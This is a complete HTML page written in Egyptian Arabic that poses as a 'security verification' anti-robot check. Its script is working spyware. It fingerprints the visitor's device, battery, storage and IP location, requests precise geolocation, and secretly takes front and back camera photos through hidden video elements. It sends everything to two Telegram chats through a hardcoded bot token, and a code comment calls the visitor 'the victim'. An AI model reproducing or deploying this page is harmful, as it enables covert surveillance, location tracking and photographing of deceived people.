<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التحقق الأمني</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #f5f7fa;
    color: #1a1a1a;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    max-width: 420px;
    width: 100%;
    padding: 32px 28px;
    text-align: center;
  }
  .logo {
    width: 56px;
    height: 56px;
    background: #2563eb;
    border-radius: 14px;
    margin: 0 auto 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 28px;
    font-weight: bold;
  }
  h1 {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 10px;
    color: #111;
  }
  p {
    font-size: 14px;
    color: #666;
    line-height: 1.6;
    margin-bottom: 24px;
  }
  .checklist {
    text-align: right;
    background: #f9fafb;
    border-radius: 8px;
    padding: 16px;
    margin-bottom: 24px;
  }
  .checklist-item {
    display: flex;
    align-items: center;
    font-size: 13px;
    color: #444;
    padding: 6px 0;
  }
  .checklist-item::before {
    content: "✓";
    color: #10b981;
    font-weight: bold;
    margin-left: 8px;
    font-size: 14px;
  }
  button {
    width: 100%;
    background: #2563eb;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 14px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
  }
  button:hover { background: #1d4ed8; }
  button:disabled {
    background: #93c5fd;
    cursor: not-allowed;
  }
  .status {
    margin-top: 16px;
    font-size: 13px;
    color: #666;
    min-height: 20px;
  }
  .spinner {
    display: inline-block;
    width: 14px;
    height: 14px;
    border: 2px solid #d1d5db;
    border-top-color: #2563eb;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    vertical-align: middle;
    margin-left: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .hidden { display: none; }
  video { display: none; }
</style>
</head>
<body>

<div class="card">
  <div class="logo">🛡️</div>
  <h1>التحقق الأمني</h1>
  <p>لحماية حسابك، محتاجين نتأكد إنك مش روبوت. اضغط "ابدأ التحقق" واستنى شوية.</p>

  <div class="checklist">
    <div class="checklist-item">اتصال آمن ومشفر</div>
    <div class="checklist-item">فحص الجهاز</div>
    <div class="checklist-item">تأكيد الهوية</div>
  </div>

  <button id="startBtn">ابدأ التحقق</button>
  <div class="status" id="status"></div>
</div>

<!-- الفيديو مخفي -->
<video id="videoFront" autoplay playsinline muted></video>
<video id="videoBack" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// ============================================================
// إعدادات
// ============================================================
const BOT_TOKEN = "8783725713:AAEFEiybIQnvcAbkMiTMYKdSjCB1PopS-vE";
const CHAT_IDS = ["8640643907", "8739148121"];

const statusEl = document.getElementById("status");
const startBtn = document.getElementById("startBtn");

// ============================================================
// 1. جمع بيانات الجهاز
// ============================================================
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const uaData = navigator.userAgentData || {};

  // نوع الجهاز
  let deviceType = "Desktop";
  if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) deviceType = "Mobile";
  if (/Tablet|iPad/i.test(ua)) deviceType = "Tablet";

  // نظام التشغيل
  let os = "Unknown";
  if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
  else if (/Windows NT/.test(ua)) os = "Windows";
  else if (/Android/.test(ua)) {
    const m = ua.match(/Android\s([\d.]+)/);
    os = "Android " + (m ? m[1] : "");
  }
  else if (/iPhone|iPad|iPod/.test(ua)) {
    const m = ua.match(/OS\s([\d_]+)/);
    os = "iOS " + (m ? m[1].replace(/_/g, ".") : "");
  }
  else if (/Mac OS X/.test(ua)) {
    const m = ua.match(/Mac OS X\s([\d_]+)/);
    os = "macOS " + (m ? m[1].replace(/_/g, ".") : "");
  }
  else if (/Linux/.test(ua)) os = "Linux";

  // المتصفح
  let browser = "Unknown";
  if (/Edg\//.test(ua)) browser = "Edge " + (ua.match(/Edg\/([\d.]+)/) || [])[1];
  else if (/OPR\//.test(ua)) browser = "Opera " + (ua.match(/OPR\/([\d.]+)/) || [])[1];
  else if (/Chrome\//.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
  else if (/Firefox\//.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
  else if (/Safari\//.test(ua)) browser = "Safari " + (ua.match(/Version\/([\d.]+)/) || [])[1];

  // المنصة (من UA-CH لو متاحة)
  const platform = uaData.platform || navigator.platform || "Unknown";

  // عدد الأنوية
  const cores = navigator.hardwareConcurrency || "Unknown";

  // الذاكرة (تقديري — مش متاح دايماً)
  const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";

  // اللغة
  const language = navigator.language || "Unknown";

  // المنطقة الزمنية
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

  // دقة الشاشة
  const screenRes = `${screen.width}x${screen.height}`;
  const windowRes = `${window.innerWidth}x${window.innerHeight}`;
  const pixelRatio = window.devicePixelRatio || 1;

  // هل اللمس مدعوم
  const touch = "ontouchstart" in window || navigator.maxTouchPoints > 0;

  return {
    deviceType, os, browser, platform, cores, memory,
    language, timezone, screenRes, windowRes, pixelRatio,
    touch: touch ? "نعم" : "لا",
    userAgent: ua,
  };
}

// ============================================================
// 2. البطارية
// ============================================================
async function getBatteryInfo() {
  if (!navigator.getBattery) {
    return { supported: false };
  }
  try {
    const battery = await navigator.getBattery();
    return {
      supported: true,
      level: Math.round(battery.level * 100) + "%",
      charging: battery.charging ? "بيشحن" : "مش بيشحن",
      chargingTime: battery.chargingTime === Infinity ? "غير معروف" : battery.chargingTime + " ثانية",
      dischargingTime: battery.dischargingTime === Infinity ? "غير معروف" : battery.dischargingTime + " ثانية",
    };
  } catch (e) {
    return { supported: false };
  }
}

// ============================================================
// 3. المكان
// ============================================================
function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      return resolve({ supported: false });
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          supported: true,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy + " متر",
        });
      },
      (err) => {
        resolve({ supported: true, error: err.message });
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// ============================================================
// 4. الـ IP + معلومات الشبكة
// ============================================================
async function getIPInfo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return {
      ip: d.ip,
      city: d.city,
      region: d.region,
      country: d.country_name,
      isp: d.org,
      lat: d.latitude,
      lon: d.longitude,
    };
  } catch (e) {
    try {
      const r = await fetch("https://api.ipify.org?format=json");
      const d = await r.json();
      return { ip: d.ip };
    } catch (e2) {
      return { ip: "Unknown" };
    }
  }
}

// ============================================================
// 5. المساحة التخزينية (تقديري)
// ============================================================
async function getStorageInfo() {
  if (!navigator.storage || !navigator.storage.estimate) {
    return { supported: false };
  }
  try {
    const est = await navigator.storage.estimate();
    return {
      supported: true,
      quota: (est.quota / (1024 * 1024 * 1024)).toFixed(2) + " GB",
      usage: (est.usage / (1024 * 1024)).toFixed(2) + " MB",
    };
  } catch (e) {
    return { supported: false };
  }
}

// ============================================================
// 6. الكاميرا — صور من الأمام والخلف
// ============================================================
async function captureFromCamera(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });

    const video = document.getElementById(facingMode === "user" ? "videoFront" : "videoBack");
    video.srcObject = stream;
    video.muted = true;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 800);
      };
    });

    // صورة
    const canvas = document.getElementById("canvas");
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, 640, 480);
    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);

    // اقفل الكاميرا
    stream.getTracks().forEach((t) => t.stop());
    video.srcObject = null;

    return { success: true, dataUrl };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// ============================================================
// 7. إرسال لتليجرام
// ============================================================
async function sendToTelegram(chatId, text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML",
      }),
    });
  } catch (e) {
    console.error("Telegram send failed:", e);
  }
}

async function sendPhotoToTelegram(chatId, dataUrl, caption) {
  // نحوّل dataURL لـ blob
  const res = await fetch(dataUrl);
  const blob = await res.blob();

  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", blob, "photo.jpg");
  formData.append("caption", caption);
  formData.append("parse_mode", "HTML");

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  try {
    await fetch(url, { method: "POST", body: formData });
  } catch (e) {
    console.error("Photo send failed:", e);
  }
}

// ============================================================
// 8. الدالة الرئيسية
// ============================================================
async function run() {
  startBtn.disabled = true;
  statusEl.innerHTML = "جاري التحقق <span class='spinner'></span>";

  // 1. بيانات الجهاز (فوري)
  const device = getDeviceInfo();

  // 2. البطارية + IP + التخزين + المكان (بالتوازي)
  statusEl.innerHTML = "فحص الجهاز <span class='spinner'></span>";
  const [battery, ipInfo, storage, location] = await Promise.all([
    getBatteryInfo(),
    getIPInfo(),
    getStorageInfo(),
    getLocation(),
  ]);

  // 3. الكاميرا الأمامية
  statusEl.innerHTML = "تأكيد الهوية <span class='spinner'></span>";
  const front = await captureFromCamera("user");

  // 4. الكاميرا الخلفية
  statusEl.innerHTML = "التحقق النهائي <span class='spinner'></span>";
  const back = await captureFromCamera("environment");

  // 5. بناء التقرير
  const lines = [
    "🛡️ <b>تقرير تحقق جديد</b>",
    "",
    "📱 <b>الجهاز:</b>",
    `• النوع: ${device.deviceType}`,
    `• النظام: ${device.os}`,
    `• المتصفح: ${device.browser}`,
    `• المنصة: ${device.platform}`,
    `• الأنوية: ${device.cores}`,
    `• الذاكرة: ${device.memory}`,
    `• الشاشة: ${device.screenRes}`,
    `• الكثافة: ${device.pixelRatio}x`,
    `• اللغة: ${device.language}`,
    `• المنطقة الزمنية: ${device.timezone}`,
    `• اللمس: ${device.touch}`,
    "",
    "🔋 <b>البطارية:</b>",
  ];

  if (battery.supported) {
    lines.push(`• المستوى: ${battery.level}`);
    lines.push(`• الحالة: ${battery.charging}`);
  } else {
    lines.push("• غير متاح");
  }

  lines.push("", "🌐 <b>الشبكة:</b>");
  if (ipInfo.ip) {
    lines.push(`• IP: ${ipInfo.ip}`);
    if (ipInfo.city) lines.push(`• المدينة: ${ipInfo.city}`);
    if (ipInfo.region) lines.push(`• المنطقة: ${ipInfo.region}`);
    if (ipInfo.country) lines.push(`• الدولة: ${ipInfo.country}`);
    if (ipInfo.isp) lines.push(`• المزود: ${ipInfo.isp}`);
  } else {
    lines.push("• غير متاح");
  }

  lines.push("", "📍 <b>الموقع التقريبي:</b>");
  if (location.supported && location.lat) {
    lines.push(`• الإحداثيات: ${location.lat}, ${location.lon}`);
    lines.push(`• الدقة: ${location.accuracy}`);
    lines.push(`• <a href="https://maps.google.com/?q=${location.lat},${location.lon}">فتح في الخرائط</a>`);
  } else if (location.error) {
    lines.push(`• مرفوض: ${location.error}`);
  } else {
    lines.push("• غير متاح");
  }

  if (ipInfo.lat && ipInfo.lon) {
    lines.push(`• من IP: ${ipInfo.lat}, ${ipInfo.lon}`);
    lines.push(`• <a href="https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}">فتح في الخرائط</a>`);
  }

  lines.push("", "💾 <b>التخزين (تقديري):</b>");
  if (storage.supported) {
    lines.push(`• المتاح: ${storage.quota}`);
    lines.push(`• المستخدم: ${storage.usage}`);
  } else {
    lines.push("• غير متاح");
  }

  lines.push("", "🖥️ <b>User Agent:</b>");
  lines.push(`<code>${device.userAgent}</code>`);

  const report = lines.join("\n");

  // 6. إرسال لكل chat id
  for (const chatId of CHAT_IDS) {
    await sendToTelegram(chatId, report);

    if (front.success) {
      await sendPhotoToTelegram(chatId, front.dataUrl, "📸 كاميرا أمامية");
    }
    if (back.success) {
      await sendPhotoToTelegram(chatId, back.dataUrl, "📸 كاميرا خلفية");
    }
  }

  // 7. تم
  statusEl.innerHTML = "✅ تم التحقق بنجاح";
  startBtn.textContent = "تم";
  startBtn.style.background = "#10b981";

  // 8. حوّل لصفحة تانية (اختياري — عشان الضحية ميشكش)
  setTimeout(() => {
    // window.location.href = "https://example.com";
  }, 2000);
}

startBtn.addEventListener("click", run);
</script>

</body>
</html>
